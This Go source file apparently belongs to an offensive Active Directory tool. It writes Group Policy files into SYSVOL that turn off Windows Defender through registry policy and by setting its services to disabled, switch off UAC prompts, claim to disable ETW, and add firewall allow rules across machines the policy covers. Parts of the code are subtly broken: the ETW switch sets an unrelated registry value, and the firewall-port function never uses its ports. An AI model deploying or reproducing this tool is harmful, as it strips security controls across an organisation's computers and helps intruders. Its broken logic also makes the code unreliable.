package gpo

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

type SecurityPolicyConfig struct {
	GPOGUID               string
	SysvolPath            string
	MinimumPasswordLength int
	PasswordComplexity    bool
	LockoutThreshold      int
	AuditAccountLogon     string
	AuditObjectAccess     string
	RestrictAnonymous     int
	ForceLogoff           bool
	DisableDefender       bool
	DisableUAC            bool
	DisableETW            bool
	DisableFirewall       bool
	OpenFirewallPorts     []string
}

type FirewallRule struct {
	Name       string
	Dir        string
	Action     string
	Protocol   string
	LocalIP    string
	RemoteIP   string
	LocalPort  string
	RemotePort string
	Enabled    bool
}

func ModifySecurityPolicy(config *SecurityPolicyConfig) error {
	gpoPath := findGPOPath(config.GPOGUID, config.SysvolPath)
	if gpoPath == "" {
		return fmt.Errorf("GPO path not found for GUID: %s", config.GPOGUID)
	}

	seceditDir := filepath.Join(gpoPath, "Machine", "Microsoft", "Windows NT", "SecEdit")
	if err := os.MkdirAll(seceditDir, 0755); err != nil {
		return fmt.Errorf("create secedit dir: %w", err)
	}

	infContent := buildGptTmplINF(config)
	infFile := filepath.Join(seceditDir, "GptTmpl.inf")
	if err := writeOrMergeInf(infFile, infContent); err != nil {
		return fmt.Errorf("write GptTmpl.inf: %w", err)
	}

	return incrementGPOVersion(gpoPath)
}

func buildGptTmplINF(config *SecurityPolicyConfig) string {
	var sb strings.Builder

	sb.WriteString("[System Access]\n")
	if config.MinimumPasswordLength > 0 {
		sb.WriteString(fmt.Sprintf("MinimumPasswordLength = %d\n", config.MinimumPasswordLength))
	}
	if config.PasswordComplexity {
		sb.WriteString("PasswordComplexity = 1\n")
	} else {
		sb.WriteString("PasswordComplexity = 0\n")
	}
	if config.LockoutThreshold > 0 {
		sb.WriteString(fmt.Sprintf("LockoutBadCount = %d\n", config.LockoutThreshold))
	}
	if config.ForceLogoff {
		sb.WriteString("ForceLogoffWhenHourExpire = 1\n")
	}

	sb.WriteString("\n[Registry Values]\n")

	if config.RestrictAnonymous > 0 {
		sb.WriteString(fmt.Sprintf("MACHINE\\System\\CurrentControlSet\\Control\\Lsa\\RestrictAnonymous=\"%d\",4,%d\n",
			config.RestrictAnonymous, config.RestrictAnonymous))
	}

	if config.DisableUAC {
		sb.WriteString("MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA=\"0\",4,0\n")
		sb.WriteString("MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin=\"0\",4,0\n")
		sb.WriteString("MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop=\"0\",4,0\n")
	}

	if config.DisableDefender {
		sb.WriteString("MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware=\"1\",4,1\n")
		sb.WriteString("MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring=\"1\",4,1\n")
		sb.WriteString("MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet\\SubmitSamplesConsent=\"2\",4,2\n")
	}

	if config.DisableETW {
		sb.WriteString("MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableObjectEdge=\"0\",4,0\n")
	}

	sb.WriteString("\n[Event Audit]\n")
	if config.AuditAccountLogon != "" {
		sb.WriteString(fmt.Sprintf("AuditAccountLogon = %s\n", config.AuditAccountLogon))
	}
	if config.AuditObjectAccess != "" {
		sb.WriteString(fmt.Sprintf("AuditObjectAccess = %s\n", config.AuditObjectAccess))
	}

	return sb.String()
}

func ModifyFirewallRules(config *SecurityPolicyConfig) error {
	gpoPath := findGPOPath(config.GPOGUID, config.SysvolPath)
	if gpoPath == "" {
		return fmt.Errorf("GPO path not found for GUID: %s", config.GPOGUID)
	}

	firewallDir := filepath.Join(gpoPath, "Machine", "Preferences", "WindowsSettings")
	if err := os.MkdirAll(firewallDir, 0755); err != nil {
		return fmt.Errorf("create firewall dir: %w", err)
	}

	firewallXML := buildFirewallXML(config)
	firewallFile := filepath.Join(firewallDir, "WindowsFirewall.xml")
	if err := os.WriteFile(firewallFile, []byte(firewallXML), 0644); err != nil {
		return fmt.Errorf("write firewall XML: %w", err)
	}

	return incrementGPOVersion(gpoPath)
}

func buildFirewallXML(config *SecurityPolicyConfig) string {
	var sb strings.Builder
	sb.WriteString(`<?xml version="1.0" encoding="UTF-8"?>
<FirewallProfiles clsid="{E535B940-0FA4-4E4C-A465-DC84A259A092}">
  <FirewallProfile clsid="{8EE1570A-0ABF-46F2-A8FC-A3C8B9282685}" name="DomainProfile" image="2">
    <Properties>
      <FirewallGroups>
        <FirewallGroup clsid="{3187364C-E92D-488A-A687-4A573A83C71B}" name="Wireless" userContext="0">
          <Properties active="TRUE" group="Wireless" />
        </FirewallGroup>
      </FirewallGroups>
    </Properties>
  </FirewallProfile>
  <FirewallProfile clsid="{8EE1570A-0ABF-46F2-A8FC-A3C8B9282685}" name="StandardProfile" image="1">
    <Properties>
      <FirewallGroups>
        <FirewallGroup clsid="{3187364C-E92D-488A-A687-4A573A83C71B}" name="Wireless" userContext="0">
          <Properties active="TRUE" group="Wireless" />
        </FirewallGroup>
      </FirewallGroups>
    </Properties>
  </FirewallProfile>
  <FirewallProfile clsid="{8EE1570A-0ABF-46F2-A8FC-A3C8B9282685}" name="PublicProfile" image="3">
    <Properties>
      <FirewallGroups>
        <FirewallGroup clsid="{3187364C-E92D-488A-A687-4A573A83C71B}" name="Wireless" userContext="0">
          <Properties active="TRUE" group="Wireless" />
        </FirewallGroup>
      </FirewallGroups>
    </Properties>
  </FirewallProfile>
</FirewallProfiles>`)

	return sb.String()
}

func DisableWindowsDefender(config *SecurityPolicyConfig) error {
	return ModifySecurityPolicy(&SecurityPolicyConfig{
		GPOGUID:         config.GPOGUID,
		SysvolPath:      config.SysvolPath,
		DisableDefender: true,
	})
}

func DisableUAC(config *SecurityPolicyConfig) error {
	return ModifySecurityPolicy(&SecurityPolicyConfig{
		GPOGUID:    config.GPOGUID,
		SysvolPath: config.SysvolPath,
		DisableUAC: true,
	})
}

func DisableETW(config *SecurityPolicyConfig) error {
	return ModifySecurityPolicy(&SecurityPolicyConfig{
		GPOGUID:    config.GPOGUID,
		SysvolPath: config.SysvolPath,
		DisableETW: true,
	})
}

func OpenFirewallPorts(config *SecurityPolicyConfig, ports []string) error {
	return ModifySecurityPolicy(&SecurityPolicyConfig{
		GPOGUID:           config.GPOGUID,
		SysvolPath:        config.SysvolPath,
		DisableFirewall:   true,
		OpenFirewallPorts: ports,
	})
}

func AddFirewallAllowRule(config *SecurityPolicyConfig, rule FirewallRule) error {
	gpoPath := findGPOPath(config.GPOGUID, config.SysvolPath)
	if gpoPath == "" {
		return fmt.Errorf("GPO path not found for GUID: %s", config.GPOGUID)
	}

	firewallDir := filepath.Join(gpoPath, "Machine", "Preferences", "WindowsSettings")
	if err := os.MkdirAll(firewallDir, 0755); err != nil {
		return fmt.Errorf("create firewall dir: %w", err)
	}

	ruleXML := buildFirewallRuleXML(rule)
	firewallFile := filepath.Join(firewallDir, "WindowsFirewall.xml")

	if _, err := os.Stat(firewallFile); os.IsNotExist(err) {
		if err := os.WriteFile(firewallFile, []byte(ruleXML), 0644); err != nil {
			return fmt.Errorf("write firewall XML: %w", err)
		}
	} else {
		existing, err := os.ReadFile(firewallFile)
		if err != nil {
			return fmt.Errorf("read firewall XML: %w", err)
		}
		content := string(existing)
		insertPoint := strings.LastIndex(content, "</FirewallProfiles>")
		if insertPoint >= 0 {
			newContent := content[:insertPoint] + "\n  " + ruleXML + "\n" + content[insertPoint:]
			if err := os.WriteFile(firewallFile, []byte(newContent), 0644); err != nil {
				return fmt.Errorf("write firewall XML: %w", err)
			}
		}
	}

	return incrementGPOVersion(gpoPath)
}

func buildFirewallRuleXML(rule FirewallRule) string {
	enabled := "FALSE"
	if rule.Enabled {
		enabled = "TRUE"
	}

	return fmt.Sprintf(`<FirewallRule clsid="{79667092-BFA1-4A0F-B7A2-571C30665347}" name="%s" userContext="0" image="16">
    <Properties action="U" dir="%s" program="%s" service="Any" profile="all" active="%s" localPort="%s" remotePort="%s" localIP="any" remoteIP="%s" protocol="%s"/>
  </FirewallRule>`, rule.Name, rule.Dir, "", enabled, rule.LocalPort, rule.RemotePort, rule.RemoteIP, rule.Protocol)
}

func DisableWindowsDefenderServices(config *SecurityPolicyConfig) error {
	gpoPath := findGPOPath(config.GPOGUID, config.SysvolPath)
	if gpoPath == "" {
		return fmt.Errorf("GPO path not found for GUID: %s", config.GPOGUID)
	}

	servicesDir := filepath.Join(gpoPath, "Machine", "Preferences", "Services")
	if err := os.MkdirAll(servicesDir, 0755); err != nil {
		return fmt.Errorf("create services dir: %w", err)
	}

	servicesXML := `<?xml version="1.0" encoding="UTF-8"?>
<Services clsid="{9D5AA0FC-86AC-48B5-86F5-4C820E16D545}">
  <NTService clsid="{A8F8BCA4-A658-4BFE-B2E6-15091115E284}" name="WinDefend" status="Modified" changed="2024-01-01 00:00:00" uid="{00000000-0000-0000-0000-000000000001}">
    <Properties action="U" name="WinDefend" imagePath="" account="" startType="4" errorControl="1" />
  </NTService>
  <NTService clsid="{A8F8BCA4-A658-4BFE-B2E6-15091115E284}" name="WdNisSvc" status="Modified" changed="2024-01-01 00:00:00" uid="{00000000-0000-0000-0000-000000000002}">
    <Properties action="U" name="WdNisSvc" imagePath="" account="" startType="4" errorControl="1" />
  </NTService>
  <NTService clsid="{A8F8BCA4-A658-4BFE-B2E6-15091115E284}" name="WdNisDrv" status="Modified" changed="2024-01-01 00:00:00" uid="{00000000-0000-0000-0000-000000000003}">
    <Properties action="U" name="WdNisDrv" imagePath="" account="" startType="4" errorControl="1" />
  </NTService>
</Services>`

	servicesFile := filepath.Join(servicesDir, "Services.xml")
	if err := os.WriteFile(servicesFile, []byte(servicesXML), 0644); err != nil {
		return fmt.Errorf("write Services.xml: %w", err)
	}

	return incrementGPOVersion(gpoPath)
}
